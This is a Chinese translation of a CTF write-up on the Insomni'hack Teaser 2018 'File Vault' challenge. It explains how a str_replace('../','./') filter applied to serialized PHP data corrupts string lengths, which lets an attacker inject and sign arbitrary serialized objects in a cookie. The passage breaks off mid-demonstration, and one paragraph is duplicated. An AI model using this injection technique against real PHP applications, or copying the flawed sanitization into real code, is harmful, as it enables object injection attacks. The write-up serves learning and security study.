# Insomni'hack Teaser 2018比赛Write Up：File Vault题目
|
##### 译文声明
本文是翻译文章，文章原作者 corb3nik，文章来源：corb3nik.github.io
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
Insomni’hack Teaser
2018是瑞士举办的一场CTF比赛，今年已经是第六届。该比赛主要考察Pwning、Web和加密相关的题目，本次比赛的前六支队伍都将获邀参加在日内瓦举行的Insomni’hack
2018会议。
赛事官网为： 。
## 题目描述
通过File Vault，用户可以将文件安全地存储在系统上，并且支持对部分文件进行检索。在本题目中，其中所有的数据都已经预先部署好。
## 挑战内容
File
Vault是一个沙盒文件管理器，允许用户上传文件，同时还允许查看文件的元数据。在本次比赛期间，这道挑战题目是我的最爱。即使已经提供了相关的源代码，但这一题仍然有非常多的独创性，可以供我们学习探讨。
如上所述，该题目向选手提供了应用程序的源代码，用户可以进行下面五类操作：
  1. 主页 / Home（查看主页）；
  2. 上传 / Upload（上传新文件）；
  3. 更改名称 / Change Name（重命名现有文件）；
  4. 打开 / Open（查看现有文件的元数据）；
  5. 重置 / Reset（删除沙盒中的所有文件）
其中的每一个操作，都是在沙盒环境中执行的。这里的沙盒，是程序生成的用户专属文件夹，其生成代码如下：
    $sandbox_dir = 'sandbox/'.sha1($_SERVER['REMOTE_ADDR']);
该沙盒还可以防止PHP执行，以生成的.htaccess文件为例，我们可以看到其中的php_flag engine off指令：
    if(!is_dir($sandbox_dir))
    mkdir($sandbox_dir);
    if(!is_file($sandbox_dir.'/.htaccess'))
    file_put_contents($sandbox_dir.'/.htaccess', "php_flag engine off");
## Web应用的工作原理
每一个上传的文件，都由PHP中的VaultFile对象表示：
    class VaultFile {
        function upload($init_filename, $content) {
            global $sandbox_dir;
            $fileinfo = pathinfo($init_filename);
            $fileext = isset($fileinfo['extension']) ? ".".$fileinfo['extension'] : '.txt';
            file_put_contents($sandbox_dir.'/'.sha1($content).$fileext, $content);
            $this->fakename = $init_filename;
            $this->realname = sha1($content).$fileext;
        }
        function open($fakename, $realname){
            global $sandbox_dir;
            $fp = fopen($sandbox_dir.'/'.$realname, 'r');
            $analysis = "The file named " . htmlspecialchars($fakename).
                        " is located in folder $sandbox_dir/$realname.
                          Here all the informations about this file : ".
                        print_r(fstat($fp),true);
            return $analysis;
        }
    }
在上传新文件时，将使用以下属性来创建VaultFile：
fakename：用户上传文件的原始文件名；
realname：自动生成的文件名，用于在磁盘上存储文件。
通过Open操作查看文件时，fakename用于文件名的显示，而在文件系统中所保存的文件，实际上其文件名为realname中的名称。
然后，会将VaultFile对象添加到数组，通过自定义的s_serialize()函数对其进行序列化，并通过文件Cookie返回给用户。当用户想要查看文件时，Web应用程序会获取用户的Cookie，通过s_unserialized()函数对VaultFile对象的数组反序列化，随后对其进行相应的处理。
下面是VaultFile对象的一个示例：
    a:1:{i:0;O:9:"VaultFile":2:{s:8:"fakename";s:4:"asdf";s:8:"realname";s:44:"6322fe412ca3cd526522d9d7fde5f2a383ca4c3f.txt";}}e28cae7d9495e4f9e9c65e268f8ac4d975f4c94e02b04fa1144a9400979dae23
以下是用于生成上述序列化对象的相关代码：
    function s_serialize($a, $secret) {
      $b = serialize($a);
      $b = str_replace("../","./",$b);
      return $b.hash_hmac('sha256', $b, $secret);
    };
    function s_unserialize($a, $secret) {
      $hmac = substr($a, -64);
      if($hmac === hash_hmac('sha256', substr($a, 0, -64), $secret))
        return unserialize(substr($a, 0, -64));
    }
    // ...
    case 'home':
    default:
      $content =  "[Some irrelevant HTML code]";
      $files = s_unserialize($_COOKIE['files'], $secret);
      if($files) {
          $content .= "";
          $i = 0;
          foreach($files as $file) {
              $content .= "[More HTML code displaying the contents of $file]";
              $i++;
          }
          $content .= "";
      }
      break;
    case 'upload':
      if($_SERVER['REQUEST_METHOD'] === "POST") {
          if(isset($_FILES['vault_file'])) {
              $vaultfile = new VaultFile;
              $vaultfile->upload($_FILES['vault_file']['name'],
                file_get_contents($_FILES['vault_file']['tmp_name']));
              $files = s_unserialize($_COOKIE['files'], $secret);
              $files[] = $vaultfile;
              setcookie('files', s_serialize($files, $secret));
              header("Location: index.php?action=home");
              exit;
          }
      }
      break;
在这里，由于用户控制的Cookie被直接发送到s_unserialize()函数，所以我们可以尝试寻找PHP对象注入漏洞。
在此我就不再详细介绍对象注入的原理，大家可以参考我此前的文章《Practical PHP Object
Injection》：
## s_serialize()和s_unserialize()函数
在开始解题之前，我认为这是一个典型的对象序列化问题。然而，在阅读了源代码之后，我很快就意识到这远比想象的更复杂，同时也理解了为什么目前仅有5个团队解决了这道题。
首先，即使s_*serialize函数确实可以接受用户控制的参数，序列化后的对象也会被签名，并通过$secret进行验证。如果s_unserialize()函数中的签名无效，那么便不会对该对象进行反序列化操作：
    function s_serialize($a, $secret) {
      $b = serialize($a);
      $b = str_replace("../","./",$b);
      return $b.hash_hmac('sha256', $b, $secret);
    };
    function s_unserialize($a, $secret) {
      $hmac = substr($a, -64);
      if($hmac === hash_hmac('sha256', substr($a, 0, -64), $secret))
        return unserialize(substr($a, 0, -64));
    }
因此，尽管我们可以将任意的PHP对象传递给unserialize()函数，但我们并不能控制这些对象，因为它们将不会被返回。
此外，源代码中没有 **wakeup()或**
destruct()这样的函数，因此我们也不能使用此前常用的一些方法。仅仅通过unserialize()调用，是无法攻破这一题的。
最后，就算是我们成功伪造了拥有正确签名的序列化对象，我们也没有办法去任意地读/写文件。
## 发现漏洞：破坏序列化对象
随着不断探索，我们发现了这一应用程序中的漏洞，具体代码如下：
    function s_serialize($a, $secret) {
      $b = serialize($a);
      $b = str_replace("../","./",$b);
      return $b.hash_hmac('sha256', $b, $secret);
    };
代码的作者添加了一个str_replace()调用，用来过滤掉../序列。这就存在一个问题，str_replace调用是在一个序列化的对象上执行的，而不是一个字符串。
问题的关键在于，这是一个序列化数组的片段。
    php > $array = array();
    php > $array[] = "../";
    php > $array[] = "hello";
    php > echo serialize($array);
    a:2:{i:0;s:3:"../";i:1;s:5:"hello";}
接下来，让我们使用../过滤器：
    php > echo str_replace("../","./", serialize($array));
    a:2:{i:0;s:3:"./";i:1;s:5:"helloa:2:{i:0;s:3:"./";i:1;s:5:"hello";}
通过过滤，确实已经将“../”改为了“./”，然而，序列化字符串的大小并没有改变。s:3:”./“;显示的字符串大小为3，然而实际上它的大小是2！
当这个损坏的对象被unserialize()处理时，PHP会将序列化对象(“)中的下一个字符视为其值的一部分：
    a:2:{i:0;s:3:"./";i:1;s:5:"hello";}
               ^  ---  $array = array();
    php > $array[] = "../../../../../../../../../../../../";
    php > $array[] = "hello";
    php > echo serialize($array);
    a:2:{i:0;s:36:"../../../../../../../../../../../../";i:1;s:5:"hello";}
    php > echo str_replace("../","./", serialize($array));
    a:2:{i:0;s:36:"././././././././././././";i:1;s:5:"hello";}
               ^^  ------------------------------------  unserialize('a:2:{i:0;s:36:"././././././././././././";i:1;s:5:"hello";}');
    PHP Notice:  unserialize(): Error at offset 51 of 58 bytes in php shell code on line 1
    Notice: unserialize(): Error at offset 51 of 58 bytes in php shell code on line 1
因此，在这一题的挑战中，我们可以借助../序列来重命名此前上传的文件，从而实现该漏洞的利用。Web应用程序会顺畅地实现重命名操作，并会对包含已损坏对象的新Cookie进行因此，在这一题的挑战中，我们可以借助../序列来重命名此前上传的文件，从而实现该漏洞的利用。Web应用程序会顺畅地实现重命名操作，并会对包含已损坏对象的新Cookie进行签名。
## 伪造任意对象并签名
现在，我们可以对损坏的序列化对象进行签名，但在此之前，我们还是要弄清楚如何利用这一漏洞来对有效的对象进行签名。
请注意，在上文的最后一个例子中，我们是通过添加多个../字符串，最终溢出了数组中的下一个对象（““hello”）。
既然我们已经能够控制hello字符串，那么我们就可以用部分序列化对象来代替hello。我们可以将它视为SQL注入问题，必须匹配两端的引号，来保证查询的有效性。
下面是一个例子：
    php > $array = array();
    php > $array[] = "../../../../../../../../../../../../../";
    php > $array[] = 'A";i:1;s:8:"Injected';
    php > echo serialize($array);
    a:2:{i:0;s:39:"../../../../../../../../../../../../../";i:1;s:20:"A";i:1;s:8:"Injected";}
    php > $x = str_replace("../", "./", serialize($array));
    php > echo $x;